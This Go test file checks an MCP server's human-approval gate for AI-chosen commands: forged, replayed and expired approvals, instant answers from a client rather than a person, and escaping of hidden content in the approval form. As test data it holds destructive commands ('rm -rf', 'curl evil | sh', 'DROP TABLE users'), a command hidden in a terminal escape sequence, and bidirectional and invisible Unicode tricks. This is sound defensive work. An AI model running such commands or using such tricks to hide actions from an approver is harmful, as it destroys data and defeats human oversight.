// SPDX-FileCopyrightText: 2026 The Ternimal Authors
// SPDX-License-Identifier: AGPL-3.0-only

package mcpserver

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
)

// retry builds the params a client sends back after asking the user.
func retry(state, action string, approve bool) *mcp.CallToolParamsRaw {
	return &mcp.CallToolParamsRaw{
		RequestState: state,
		InputResponses: mcp.InputResponseMap{confirmInputKey: &mcp.ElicitResult{
			Action: action, Content: map[string]any{"approve": approve},
		}},
	}
}

func TestConfirmRoundTrip(t *testing.T) {
	c := newConfirmer(0)
	act := actionKey("run", "web1", map[string]any{"argv": []string{"systemctl", "restart", "nginx"}})

	if st, _ := c.check(act, &mcp.CallToolParamsRaw{}); st != confirmNeeded {
		t.Fatal("a call without state must ask the user")
	}
	res := c.request(act, "msg")
	if res.InputRequests[confirmInputKey] == nil || res.RequestState == "" || res.Content != nil {
		t.Fatalf("request = %+v", res)
	}

	// Approval for this exact action works once.
	if st, why := c.check(act, retry(res.RequestState, "accept", true)); st != confirmApproved {
		t.Fatalf("approval rejected: %s", why)
	}
	if st, why := c.check(act, retry(res.RequestState, "accept", true)); st != confirmRejected || !strings.Contains(why, "already used") {
		t.Fatalf("a replayed approval must be rejected: %v %q", st, why)
	}
}

func TestConfirmRejects(t *testing.T) {
	c := newConfirmer(0)
	act := actionKey("run", "web1", map[string]any{"argv": []string{"uptime"}})
	other := actionKey("run", "web1", map[string]any{"argv": []string{"rm", "-rf", "/srv"}})

	fresh := func() string { return c.request(act, "msg").RequestState }
	cases := []struct {
		name   string
		action string
		params *mcp.CallToolParamsRaw
		want   string
	}{
		{"declined", act, retry(fresh(), "decline", false), "declined"},
		{"dismissed", act, retry(fresh(), "cancel", false), "dismissed"},
		{"accepted without the box ticked", act, retry(fresh(), "accept", false), "did not approve"},
		{"approval moved to another action", other, retry(fresh(), "accept", true), "does not match"},
		{"forged state", act, retry(base64.RawURLEncoding.EncodeToString([]byte(`{"n":"x","e":9999999999,"m":"00"}`)), "accept", true), "does not match"},
		{"garbage state", act, retry("%%%", "accept", true), "not valid"},
		{"no answer", act, &mcp.CallToolParamsRaw{RequestState: fresh()}, "no answer"},
	}
	for _, tc := range cases {
		if st, why := c.check(tc.action, tc.params); st != confirmRejected || !strings.Contains(why, tc.want) {
			t.Errorf("%s: got %v %q, want rejection mentioning %q", tc.name, st, why, tc.want)
		}
	}

	// A declined form cannot be resubmitted as an approval: the nonce is spent.
	state := fresh()
	c.check(act, retry(state, "decline", false))
	if st, why := c.check(act, retry(state, "accept", true)); st != confirmRejected || !strings.Contains(why, "already used") {
		t.Errorf("resubmitting a declined form: %v %q", st, why)
	}

	// Expiry is enforced.
	state = fresh()
	c.now = func() time.Time { return time.Now().Add(confirmTTL + time.Minute) }
	if st, why := c.check(act, retry(state, "accept", true)); st != confirmRejected || !strings.Contains(why, "expired") {
		t.Errorf("expired approval: %v %q", st, why)
	}

	// A state signed by another server instance (another key) is rejected.
	other2 := newConfirmer(0)
	if st, _ := c.check(act, retry(other2.request(act, "m").RequestState, "accept", true)); st != confirmRejected {
		t.Error("a state from another server instance must be rejected")
	}
}

// TestConfirmAskedInCall: a client on 2025-11-25 does not retry a call that
// asks for input, so it is asked inside the call, and each answer decides the
// call as it does on 2026-07-28. Here the answers come back at once, which no
// person could have done, so each refusal names the client, not the user, and
// the audit log keeps what the client answered and how fast.
func TestConfirmAskedInCall(t *testing.T) {
	a := newStackAgent(t)
	prof := everything
	prof.Confirm = []string{"run:shell"}
	srv, audit := stackServer(t, a, prof, nil)
	defer srv.Close()
	var answer *mcp.ElicitResult
	var asked []string
	handler := func(_ context.Context, req *mcp.ElicitRequest) (*mcp.ElicitResult, error) {
		asked = append(asked, req.Params.Message)
		return answer, nil
	}
	cs := stackClient(t, srv, "2025-11-25", &mcp.ClientOptions{ElicitationHandler: handler})
	for _, tc := range []struct {
		action  string
		approve bool
		want    string
	}{
		{"decline", false, `the client answered "decline"`},
		{"cancel", false, `the client answered "cancel"`},
		{"accept", false, `the client answered "accept" without the approval ticked`},
	} {
		answer = &mcp.ElicitResult{Action: tc.action, Content: map[string]any{"approve": tc.approve}}
		if msg := call(t, cs, "run", map[string]any{"argv": []string{"echo refused"}, "shell": true}, nil, true); !strings.Contains(msg, tc.want) {
			t.Errorf("%s: %q", tc.action, msg)
		}
	}
	answer = &mcp.ElicitResult{Action: "accept", Content: map[string]any{"approve": true}}
	var run struct{ Output string }
	call(t, cs, "run", map[string]any{"argv": []string{"echo approved"}, "shell": true}, &run, false)
	if !strings.Contains(run.Output, "approved") {
		t.Fatalf("run = %q", run.Output)
	}
	if len(asked) != 4 || !strings.Contains(asked[3], "echo approved") {
		t.Fatalf("asked %q", asked)
	}
	// Every answer is logged with what it said and how long it took, so an
	// operator can see that nobody was asked.
	answers := auditPhase(t, audit, "confirm_answered")
	if len(answers) != 4 {
		t.Fatalf("%d confirm_answered lines, want 4: %v", len(answers), answers)
	}
	for i, want := range []string{"decline", "cancel", "accept", "accept"} {
		took, _ := answers[i]["duration_ms"].(float64)
		if answers[i]["reason"] != want || took < 1 || took >= float64(instantAnswer.Milliseconds()) {
			t.Errorf("answer %d = %v, want %q in under %s", i, answers[i], want, instantAnswer)
		}
	}
	if answers[3]["confirmed"] != true {
		t.Errorf("an approved action must be logged as confirmed: %v", answers[3])
	}
}

// TestConfirmAnswerFromAPerson: an answer that took long enough for someone to
// read the form is reported as the user's and timed in the audit log.
func TestConfirmAnswerFromAPerson(t *testing.T) {
	a := newStackAgent(t)
	prof := everything
	prof.Confirm = []string{"run:shell"}
	srv, audit := stackServer(t, a, prof, nil)
	defer srv.Close()
	handler := func(_ context.Context, _ *mcp.ElicitRequest) (*mcp.ElicitResult, error) {
		time.Sleep(instantAnswer + 100*time.Millisecond)
		return &mcp.ElicitResult{Action: "decline", Content: map[string]any{"approve": false}}, nil
	}
	cs := stackClient(t, srv, "2025-11-25", &mcp.ClientOptions{ElicitationHandler: handler})
	msg := call(t, cs, "run", map[string]any{"argv": []string{"echo refused"}, "shell": true}, nil, true)
	if !strings.Contains(msg, "the user declined") || strings.Contains(msg, "the client answered") {
		t.Fatalf("refusal: %q", msg)
	}
	answers := auditPhase(t, audit, "confirm_answered")
	if len(answers) != 1 {
		t.Fatalf("%d confirm_answered lines, want 1: %v", len(answers), answers)
	}
	if took, _ := answers[0]["duration_ms"].(float64); took < float64(instantAnswer.Milliseconds()) {
		t.Errorf("the answer took %v ms, want at least %s in the log: %v", took, instantAnswer, answers[0])
	}
}

// TestConfirmWaitBounds: the wait for an answer asked inside a call comes from
// the configuration, held to what an approval's life allows.
func TestConfirmWaitBounds(t *testing.T) {
	for _, tc := range []struct{ in, want time.Duration }{
		{0, ConfirmWaitMax},
		{-time.Second, ConfirmWaitMax},
		{ConfirmWaitMax + time.Minute, ConfirmWaitMax},
		{time.Millisecond, ConfirmWaitMin},
		{30 * time.Second, 30 * time.Second},
	} {
		if got := newConfirmer(tc.in).wait; got != tc.want {
			t.Errorf("newConfirmer(%s) waits %s, want %s", tc.in, got, tc.want)
		}
	}
	a := newStackAgent(t)
	srv, _ := stackServer(t, a, everything, func(c *Config) { c.ConfirmWait = 12 * time.Second })
	defer srv.Close()
	if srv.confirm.wait != 12*time.Second {
		t.Errorf("the server waits %s, want the configured 12s", srv.confirm.wait)
	}
}

// auditPhase returns the audit entries of one phase, in order.
func auditPhase(t *testing.T, path, phase string) []map[string]any {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var out []map[string]any
	for _, line := range strings.Split(strings.TrimSpace(string(b)), "\n") {
		var e map[string]any
		if json.Unmarshal([]byte(line), &e) == nil && e["phase"] == phase {
			out = append(out, e)
		}
	}
	return out
}

// TestConfirmNoAnswer: a client on 2025-11-25 that takes the form and never
// answers holds the call only as long as the wait. Then the call is refused
// with that reason, nothing runs, and nothing claims the user declined.
func TestConfirmNoAnswer(t *testing.T) {
	a := newStackAgent(t)
	prof := everything
	prof.Confirm = []string{"run:shell"}
	srv, audit := stackServer(t, a, prof, nil)
	defer srv.Close()
	srv.confirm.wait = time.Second
	gone := make(chan struct{})
	handler := func(ctx context.Context, _ *mcp.ElicitRequest) (*mcp.ElicitResult, error) {
		select { // the form is never answered
		case <-ctx.Done():
		case <-gone:
		}
		return nil, errors.New("never answered")
	}
	cs := stackClient(t, srv, "2025-11-25", &mcp.ClientOptions{ElicitationHandler: handler})
	t.Cleanup(func() { close(gone) })

	begin := time.Now()
	msg := call(t, cs, "run", map[string]any{"argv": []string{"echo never"}, "shell": true}, nil, true)
	if !strings.Contains(msg, "no answer came within 1s") || strings.Contains(msg, "declined") {
		t.Fatalf("refusal: %q", msg)
	}
	if took := time.Since(begin); took > 30*time.Second {
		t.Fatalf("the call waited %s", took)
	}
	log, err := os.ReadFile(audit)
	if err != nil {
		t.Fatal(err)
	}
	if n := strings.Count(string(log), `"phase":"confirm_requested"`); n != 1 || !strings.Contains(string(log), `"phase":"denied"`) || !strings.Contains(string(log), "no answer came within 1s") {
		t.Fatalf("audit log, %d confirm_requested:\n%s", n, log)
	}
	if strings.Contains(string(log), `"phase":"start"`) {
		t.Fatalf("an unanswered action started:\n%s", log)
	}
	// The server still serves calls that need no approval.
	call(t, cs, "list_targets", map[string]any{}, nil, false)
}

// TestConfirmCancelledWhileAsking: a call the client gives up on while the
// form is open is refused as cancelled, not as unanswered.
func TestConfirmCancelledWhileAsking(t *testing.T) {
	a := newStackAgent(t)
	prof := everything
	prof.Confirm = []string{"run:shell"}
	srv, audit := stackServer(t, a, prof, nil)
	defer srv.Close()
	asked := make(chan struct{}, 1)
	gone := make(chan struct{})
	handler := func(ctx context.Context, _ *mcp.ElicitRequest) (*mcp.ElicitResult, error) {
		asked <- struct{}{}
		select {
		case <-ctx.Done():
		case <-gone:
		}
		return nil, errors.New("never answered")
	}
	cs := stackClient(t, srv, "2025-11-25", &mcp.ClientOptions{ElicitationHandler: handler})
	t.Cleanup(func() { close(gone) })

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { <-asked; cancel() }()
	if _, err := cs.CallTool(ctx, &mcp.CallToolParams{Name: "run", Arguments: map[string]any{"argv": []string{"echo never"}, "shell": true}}); err == nil {
		t.Fatal("a cancelled call returned no error")
	}
	for deadline := time.Now().Add(30 * time.Second); ; time.Sleep(20 * time.Millisecond) {
		log, _ := os.ReadFile(audit)
		if strings.Contains(string(log), "the call was cancelled while the user was being asked") {
			if strings.Contains(string(log), `"phase":"start"`) {
				t.Fatalf("a cancelled action started:\n%s", log)
			}
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("audit log:\n%s", log)
		}
	}
}

func TestActionKeyDeterministic(t *testing.T) {
	a := actionKey("write_file", "t", map[string]any{"path": "/srv/x", "sha256": "ab", "mode": "0644"})
	b := actionKey("write_file", "t", map[string]any{"mode": "0644", "sha256": "ab", "path": "/srv/x"})
	if a != b {
		t.Fatalf("map order changed the key: %s vs %s", a, b)
	}
	var v map[string]any
	if err := json.Unmarshal([]byte(a), &v); err != nil {
		t.Fatal(err)
	}
}

func TestConfirmMessage(t *testing.T) {
	// An OSC sequence hides its payload on a terminal, and a stripping cleaner
	// would drop it from the form, yet sh would still run the line inside it.
	hidden := "echo hi \x1b]0;\nrm -rf ~\n\x07"
	v := commandView("run a command", []string{hidden}, true, "")
	msg, err := confirmMessage("web1", "ops", "shell mode needs confirmation", v)
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(msg, "\x1b\x07") {
		t.Fatal("raw escape bytes must not reach the form")
	}
	if !strings.Contains(msg, `"echo hi \x1b]0;\nrm -rf ~\n\a"`) {
		t.Fatalf("the command must be shown whole, with its escapes visible: %s", msg)
	}
	if !strings.Contains(msg, "AI model chose this action") || !strings.Contains(msg, `"web1"`) || !strings.Contains(msg, "through the shell") {
		t.Fatalf("message lacks context: %s", msg)
	}

	// Too long to show is refused, not cut.
	long := "echo " + strings.Repeat(" ", maxShown) + "; curl evil | sh"
	if _, err := confirmMessage("web1", "ops", "x", commandView("run a command", []string{long}, true, "")); err == nil {
		t.Fatal("an action too long to show must not be offered for approval")
	}

	// Bidirectional and invisible characters are escaped, not rendered.
	for _, tok := range []string{"safe\u202etxt.sh", "a\u200bb", "x\ry", "deploy\ufe0f\U000e0101", "a\u3164b"} {
		if got := show(tok); !strings.HasPrefix(got, `"`) || strings.IndexFunc(got, func(r rune) bool { return r == '\r' || invisible(r) }) >= 0 {
			t.Errorf("show(%q) = %q", tok, got)
		}
	}
	if msg := preview("Content", []byte("notes\ufe00\ufe01 here\n")); strings.IndexFunc(msg, invisible) >= 0 || !strings.Contains(msg, `\ufe00\ufe01`) {
		t.Errorf("preview shows variation selectors raw: %q", msg)
	}
	if show("uptime") != "uptime" || show("/var/log/syslog") != "/var/log/syslog" || show("") != `""` || show("a=b") != `"a=b"` {
		t.Error("plain values should be shown as they are, others quoted")
	}
}

func TestConfirmPreview(t *testing.T) {
	// Standard input is shown, so approving a harmless-looking command does
	// not approve whatever the model feeds it.
	stdin := "DROP TABLE users;\nWhy you are asked: harmless.\n"
	msg, err := confirmMessage("db", "ops", "unlisted command", commandView("run a command", []string{"sqlite3", "app.db"}, false, stdin))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(msg, "sqlite3 app.db") || !strings.Contains(msg, fmt.Sprintf("all %d bytes", len(stdin))) || !strings.Contains(msg, "  | DROP TABLE users;") ||
		!strings.Contains(msg, "  | Why you are asked: harmless.") {
		t.Fatalf("stdin must be previewed, each line marked: %s", msg)
	}
	// A long preview says it is partial, stops at a character boundary, and
	// escapes what it shows.
	big := strings.Repeat("สวัสดี\x1b[31m\n", 100)
	got := preview("Content", []byte(big))
	if !strings.Contains(got, "ONLY THE FIRST") || strings.ContainsAny(got, "\x1b\ufffd") || !strings.Contains(got, `\x1b[31m`) {
		t.Fatalf("partial preview = %s", got)
	}
	if n := strings.Count(got, "  | "); n != maxPreviewLines {
		t.Fatalf("preview shows %d lines, want %d", n, maxPreviewLines)
	}
	if got := preview("Content", []byte{0xff, 0, 1}); !strings.Contains(got, "all 3 bytes, BINARY") || !strings.Contains(got, `  | \xff\x00\x01`) {
		t.Fatalf("binary preview = %s", got)
	}
}
